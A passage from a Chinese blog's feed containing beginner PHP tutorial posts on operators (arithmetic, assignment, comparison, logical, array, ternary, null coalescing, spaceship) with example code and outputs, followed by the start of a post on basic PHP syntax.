2</td><td>10</td></tr><tr><td>x / y</td><td>除</td><td>x 和 y 的商</td><td>15 / 5</td><td>3</td></tr><tr><td>x % y</td><td>模</td><td>x 除以 y 的余数</td><td>5 % 2</td><td>1</td></tr><tr><td>- x</td><td>取反</td><td>x 取反</td><td>$x=-2 echo -$x</td><td>-2</td></tr><tr><td>a . b</td><td>并置</td><td>连接两个字符串</td><td>“Hi” . “Ha”</td><td>HiHa</td></tr></tbody></table></div><p>例如：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$x=<span class="number">10</span>;</span></span><br><span class="line"><span class="php">$y=<span class="number">6</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> ($x + $y); <span class="comment">// 输出16</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>;  <span class="comment">// 换行</span></span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">echo</span> ($x - $y); <span class="comment">// 输出4</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>;  <span class="comment">// 换行</span></span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">echo</span> ($x * $y); <span class="comment">// 输出60</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>;  <span class="comment">// 换行</span></span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">echo</span> ($x / $y); <span class="comment">// 输出1.6666666666667</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>;  <span class="comment">// 换行</span></span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">echo</span> ($x % $y); <span class="comment">// 输出4</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>;  <span class="comment">// 换行</span></span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">echo</span> -$x;</span></span><br></pre></td></tr></table></figure><br>运行结果：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">16</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">60</span></span><br><span class="line"><span class="number">1.6666666666667</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">-10</span></span><br></pre></td></tr></table></figure><br>PHP7+之后增加了整除运算符intdiv()<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump(<span class="built_in">int</span>div(<span class="number">10</span>, <span class="number">3</span>));</span><br></pre></td></tr></table></figure><br>运行结果:<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">int</span><span class="params">(<span class="number">3</span>)</span></span></span><br></pre></td></tr></table></figure></p><h2 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h2><div class="table-container"><table><thead><tr><th>运算符</th><th>等同于</th><th>描述</th></tr></thead><tbody><tr><td>x=y</td><td>x=y</td><td>左操作数被设置为右侧表达式的值</td></tr><tr><td>x+=y</td><td>x=x+y</td><td>加</td></tr><tr><td>x-=y</td><td>x=x-y</td><td>减</td></tr><tr><td>x*=y</td><td>x=x*y</td><td>乘</td></tr><tr><td>x/=y</td><td>x=x/y</td><td>除</td></tr><tr><td>x%=y</td><td>x=x%y</td><td>模</td></tr><tr><td>a.=b</td><td>a=a.b</td><td>连接两个字符串</td></tr></tbody></table></div><p>例如：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$x=<span class="number">10</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $x; <span class="comment">// 输出10</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$y=<span class="number">20</span>;</span></span><br><span class="line"><span class="php">$y += <span class="number">100</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $y; <span class="comment">// 输出120</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$z=<span class="number">50</span>;</span></span><br><span class="line"><span class="php">$z -= <span class="number">25</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $z; <span class="comment">// 输出25</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$i=<span class="number">5</span>;</span></span><br><span class="line"><span class="php">$i *= <span class="number">6</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $i; <span class="comment">// 输出30</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$j=<span class="number">10</span>;</span></span><br><span class="line"><span class="php">$j /= <span class="number">5</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $j; <span class="comment">// 输出2</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$k=<span class="number">15</span>;</span></span><br><span class="line"><span class="php">$k %= <span class="number">4</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $k; <span class="comment">// 输出3</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span></span><br></pre></td></tr></table></figure><br>运行结果：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">120</span></span><br><span class="line"><span class="number">25</span></span><br><span class="line"><span class="number">30</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure></p><h2 id="递增-递减运算符"><a href="#递增-递减运算符" class="headerlink" title="递增/递减运算符"></a>递增/递减运算符</h2><div class="table-container"><table><thead><tr><th>运算符</th><th>名称</th><th>描述</th></tr></thead><tbody><tr><td>++x</td><td>预递增</td><td>x加1，然后返回x</td></tr><tr><td>x++</td><td>后递增</td><td>返回x，然后x加1</td></tr><tr><td>—x</td><td>预递减</td><td>x减1，然后返回x</td></tr><tr><td>x—</td><td>后递减</td><td>返回x，然后x减1</td></tr></tbody></table></div><p>例如：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$x=<span class="number">10</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> ++$x; <span class="comment">// 输出11</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$y=<span class="number">10</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $y++; <span class="comment">// 输出10</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$z=<span class="number">5</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> --$z; <span class="comment">// 输出4</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$i=<span class="number">5</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $i--; <span class="comment">// 输出5</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span></span><br></pre></td></tr></table></figure><br>运行结果:<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">11</span></span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">5</span></span><br></pre></td></tr></table></figure></p><h2 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h2><div class="table-container"><table><thead><tr><th>运算符</th><th>名称</th><th>描述</th><th>实例</th></tr></thead><tbody><tr><td>x==y</td><td>等于</td><td>如果x等于y，则返回true</td><td>5==8返回false</td></tr><tr><td>x===y</td><td>绝对等于</td><td>如果x等于y，且它们类型相同，则返回true</td><td>5===”5”返回false</td></tr><tr><td>x!=y</td><td>不等于</td><td>如果x不等于y，则返回true</td><td>5!=8返回true</td></tr><tr><td>x&lt;&gt;y</td><td>不等于</td><td>如果x不等于y，则返回true</td><td>5&lt;&gt;8返回true</td></tr><tr><td>x!==y</td><td>绝对不等于</td><td>如果x不等于y，或它们类型不相同，则返回true</td><td>5!==”5”返回true</td></tr><tr><td>x&gt;y</td><td>大于</td><td>如果x大于y，则返回true</td><td>5&gt;8返回false</td></tr><tr><td>x&lt;y</td><td>小于</td><td>如果x小于y，则返回true</td><td>5&lt;8返回true</td></tr><tr><td>x&gt;=y</td><td>大于等于</td><td>如果x大于或者等于y，则返回true</td><td>5&gt;=8返回false</td></tr><tr><td>x&lt;=y</td><td>小于等于</td><td>如果x小于或者等于y，则返回true</td><td>5&lt;=8返回true</td></tr></tbody></table></div><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="meta"><span class="meta-keyword">$x</span>=100;</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">$y</span>="100";</span></span><br><span class="line"></span><br><span class="line">var_dump(<span class="symbol">$</span>x == <span class="symbol">$</span>y);</span><br><span class="line"></span><br><span class="line">var_dump(<span class="symbol">$</span>x === <span class="symbol">$</span>y);</span><br><span class="line"></span><br><span class="line">var_dump(<span class="symbol">$</span>x != <span class="symbol">$</span>y);</span><br><span class="line"></span><br><span class="line">var_dump(<span class="symbol">$</span>x !== <span class="symbol">$</span>y);</span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="meta-keyword">$a</span>=50;</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">$b</span>=90;</span></span><br><span class="line"></span><br><span class="line">var_dump(<span class="symbol">$</span>a &gt; <span class="symbol">$</span>b);</span><br><span class="line"></span><br><span class="line">var_dump(<span class="symbol">$</span>a &lt; <span class="symbol">$</span>b);</span><br></pre></td></tr></table></figure><p>运行结果:<br><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">bool</span>(<span class="variable"><span class="literal">true</span></span>)</span></span><br><span class="line"><span class="function"><span class="title">bool</span>(<span class="variable"><span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function"><span class="title">bool</span>(<span class="variable"><span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function"><span class="title">bool</span>(<span class="variable"><span class="literal">true</span></span>)</span></span><br><span class="line"><span class="function"><span class="title">bool</span>(<span class="variable"><span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function"><span class="title">bool</span>(<span class="variable"><span class="literal">true</span></span>)</span></span><br></pre></td></tr></table></figure></p><h2 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h2><div class="table-container"><table><thead><tr><th>运算符</th><th>名称</th><th>描述</th><th>实例</th></tr></thead><tbody><tr><td>x and y</td><td>与</td><td>如果x和y都为true，则返回true</td><td>x=6 y=3 (x<10 and y>1)返回true</td></tr><tr><td>x or y</td><td>或</td><td>如果x和y至少有一个为true，则返回true</td><td>x=6 y=3 (x==6 or y==5)返回true</td></tr><tr><td>x xor y</td><td>异或</td><td>如果x和y有且仅有一个为true，则返回true</td><td>x=6 y=3 (x==6 xor y==3)返回false</td></tr><tr><td>x &amp;&amp; y</td><td>与</td><td>如果x和y都为true，则返回true</td><td>x=6 y=3 (x<10 && y>1)返回true</td></tr><tr><td>!x</td><td>非</td><td>如果x不为true，则返回true</td><td>x=6 y=3 !(x==y)返回true</td></tr></tbody></table></div><h2 id="数组运算符"><a href="#数组运算符" class="headerlink" title="数组运算符"></a>数组运算符</h2><div class="table-container"><table><thead><tr><th>运算符</th><th>名称</th><th>描述</th></tr></thead><tbody><tr><td>x+y</td><td>集合</td><td>x和y的集合</td></tr><tr><td>x==y</td><td>相等</td><td>如果x和y具有相同的键/值对，则返回true</td></tr><tr><td>x===y</td><td>恒等</td><td>如果x和y具有相同的键/值对，且顺序相同类型相同，则返回true</td></tr><tr><td>x!=y</td><td>不相等</td><td>如果x不等于y，则返回true</td></tr><tr><td>x&lt;&gt;y</td><td>不相等</td><td>如果x不等于y，则返回true</td></tr><tr><td>x!==y</td><td>不恒等</td><td>如果x不等于y，则返回true</td></tr></tbody></table></div><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$x = <span class="keyword">array</span>(<span class="string">"a"</span> =&gt; <span class="string">"red"</span>, <span class="string">"b"</span> =&gt; <span class="string">"green"</span>);</span></span><br><span class="line"><span class="php">$y = <span class="keyword">array</span>(<span class="string">"c"</span> =&gt; <span class="string">"blue"</span>, <span class="string">"d"</span> =&gt; <span class="string">"yellow"</span>);</span></span><br><span class="line"><span class="php">$z = $x + $y; <span class="comment">// $x 和 $y 数组合并</span></span></span><br><span class="line"><span class="php">var_dump($z);</span></span><br><span class="line"><span class="php">var_dump($x == $y);</span></span><br><span class="line"><span class="php">var_dump($x === $y);</span></span><br><span class="line"><span class="php">var_dump($x != $y);</span></span><br><span class="line"><span class="php">var_dump($x &lt;&gt; $y);</span></span><br><span class="line"><span class="php">var_dump($x !== $y);</span></span><br></pre></td></tr></table></figure><p>运行结果:<br><figure class="highlight ocaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">array</span>(<span class="number">4</span>) &#123;</span><br><span class="line">  [<span class="string">"a"</span>]=&gt;</span><br><span class="line">  <span class="built_in">string</span>(<span class="number">3</span>) <span class="string">"red"</span></span><br><span class="line">  [<span class="string">"b"</span>]=&gt;</span><br><span class="line">  <span class="built_in">string</span>(<span class="number">5</span>) <span class="string">"green"</span></span><br><span class="line">  [<span class="string">"c"</span>]=&gt;</span><br><span class="line">  <span class="built_in">string</span>(<span class="number">4</span>) <span class="string">"blue"</span></span><br><span class="line">  [<span class="string">"d"</span>]=&gt;</span><br><span class="line">  <span class="built_in">string</span>(<span class="number">6</span>) <span class="string">"yellow"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">bool</span>(<span class="literal">false</span>)</span><br><span class="line"><span class="built_in">bool</span>(<span class="literal">false</span>)</span><br><span class="line"><span class="built_in">bool</span>(<span class="literal">true</span>)</span><br><span class="line"><span class="built_in">bool</span>(<span class="literal">true</span>)</span><br><span class="line"><span class="built_in">bool</span>(<span class="literal">true</span>)</span><br></pre></td></tr></table></figure></p><h2 id="三元运算符"><a href="#三元运算符" class="headerlink" title="三元运算符"></a>三元运算符</h2><p>另一个条件运算符是”?:”（或三元）运算符</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">(expr1)</span> ? <span class="comment">(expr2)</span> : <span class="comment">(expr3)</span></span><br></pre></td></tr></table></figure><p>expr1 求值为 TRUE 时的值为 expr2，在 expr1 求值为 FALSE 时的值为 expr3</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$test = <span class="string">'菜鸟教程'</span>;</span></span><br><span class="line"><span class="php"><span class="comment">// 普通写法</span></span></span><br><span class="line"><span class="php">$username = <span class="keyword">isset</span>($test) ? $test : <span class="string">'nobody'</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $username, PHP_EOL;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="comment">// PHP 5.3+ 版本写法</span></span></span><br><span class="line"><span class="php">$username = $test ?: <span class="string">'nobody'</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $username, PHP_EOL;</span></span><br></pre></td></tr></table></figure><p>运行结果:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">菜鸟教程</span><br><span class="line">菜鸟教程</span><br></pre></td></tr></table></figure><br>注意：PHP_EOL 是一个换行符，兼容更大平台</p><p>PHP7+版本多了一个NULL合并运算符<code>??</code><br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="regexp">//</span> 如果 <span class="variable">$_GET</span>[<span class="string">'user'</span>] 不存在返回 <span class="string">'nobody'</span>，否则返回 <span class="variable">$_GET</span>[<span class="string">'user'</span>] 的值</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_GET</span>[<span class="string">'user'</span>] ?? <span class="string">'nobody'</span>;</span><br><span class="line"><span class="regexp">//</span> 类似的三元运算符</span><br><span class="line"><span class="variable">$username</span> = isset(<span class="variable">$_GET</span>[<span class="string">'user'</span>]) ? <span class="variable">$_GET</span>[<span class="string">'user'</span>] : <span class="string">'nobody'</span>;</span><br></pre></td></tr></table></figure></p><h2 id="组合比较符-PHP7"><a href="#组合比较符-PHP7" class="headerlink" title="组合比较符(PHP7+)"></a>组合比较符(PHP7+)</h2><p>PHP7+ 支持组合比较符，也称之为太空船操作符，符号为 &lt;=&gt;。组合比较运算符可以轻松实现两个变量的比较，当然不仅限于数值类数据的比较</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$c</span> = <span class="variable">$a</span> <span class="variable">&lt;=&gt;</span> <span class="variable">$b</span>;</span><br></pre></td></tr></table></figure><p>解析如下:<br>如果$a&gt;$b，则$c的值为1<br>如果$a==$b，则$c的值为0<br>如果$a&lt;$b，则$c的值为-1</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">// 整型</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="number">1</span> &lt;=&gt; <span class="number">1</span>; <span class="comment">// 0</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="number">1</span> &lt;=&gt; <span class="number">2</span>; <span class="comment">// -1</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="number">2</span> &lt;=&gt; <span class="number">1</span>; <span class="comment">// 1</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="comment">// 浮点型</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="number">1.5</span> &lt;=&gt; <span class="number">1.5</span>; <span class="comment">// 0</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="number">1.5</span> &lt;=&gt; <span class="number">2.5</span>; <span class="comment">// -1</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="number">2.5</span> &lt;=&gt; <span class="number">1.5</span>; <span class="comment">// 1</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="comment">// 字符串</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"a"</span> &lt;=&gt; <span class="string">"a"</span>; <span class="comment">// 0</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"a"</span> &lt;=&gt; <span class="string">"b"</span>; <span class="comment">// -1</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"b"</span> &lt;=&gt; <span class="string">"a"</span>; <span class="comment">// 1</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span></span><br></pre></td></tr></table></figure><p>运行结果:<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">-1</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">-1</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">-1</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1.==和===很常用，可以理解为前者睁一只眼闭一只眼，后者一只都不闭</p><p>2.define()是PHP5版本的函数，在PHP7+之后基本上都使用在类的内部定义的常量。使用const申明定义，以后遇到类再说</p><p>3.intdiv()类似于取整函数,向下取整而不是四舍五入</p><p>4.字符串和数组一样都是以0开头计数</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;类型比较&quot;&gt;&lt;a href=&quot;#类型比较&quot; class=&quot;headerlink&quot; title=&quot;类型比较&quot;&gt;&lt;/a&gt;类型比较&lt;/h1&gt;&lt;p&gt;虽然PHP是弱类型语言，但是对于变量的比较还是有一些不同&lt;/p&gt;
&lt;p&gt;松散比较：使用&lt;code&gt;==&lt;/code&gt;比较，只
      
    
    </summary>
    
    
      <category term="日常学习" scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="PHP" scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/PHP/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>PHP-2020/6/1-周报0</title>
    <link href="http://yoursite.com/2020/06/02/PHP-2020-6-1-%E5%91%A8%E6%8A%A50/"/>
    <id>http://yoursite.com/2020/06/02/PHP-2020-6-1-%E5%91%A8%E6%8A%A50/</id>
    <published>2020-06-02T06:35:02.000Z</published>
    <updated>2020-06-02T07:44:39.132Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>PHP全称是超文本预处理器，是一种通用开源脚本语言</p><p>可以包含文本，HTML，JavaScript和PHP代码</p><p>可以用于生成动态页面内容；创建，打开，读取，写入，关闭服务器上的内容；收集表单数据，接受发送cookie等</p><h1 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h1><h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><p>PHP脚本可以放在文档中的任何位置</p><p>PHP脚本是以&lt;?PHP开始，以?&gt;结束</p><p>在PHP版本更新后，如果只是调试运行PHP程序，可以只写&lt;?PHP</p><p>PHP文件通常还包括了HTML标签和一些PHP脚本代码</p><p>例如,包含HTML标签的<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>My first PHP page<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"Hello World!"</span>;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br><img src="/img/PHP/周报0-0.png" alt="avatar"></p><p>就会在浏览器中输出Hello World!</p><p>也可以直接进行调试<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"Hello World"</span>;</span></span><br></pre></td></tr></table></figure><br><img src="/img/PHP/周报0-1.png" alt="avatar"></p><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p>PHP的注释和C语言，HTML很想</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// PHP单行注释</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">PHP</span></span><br><span class="line"><span 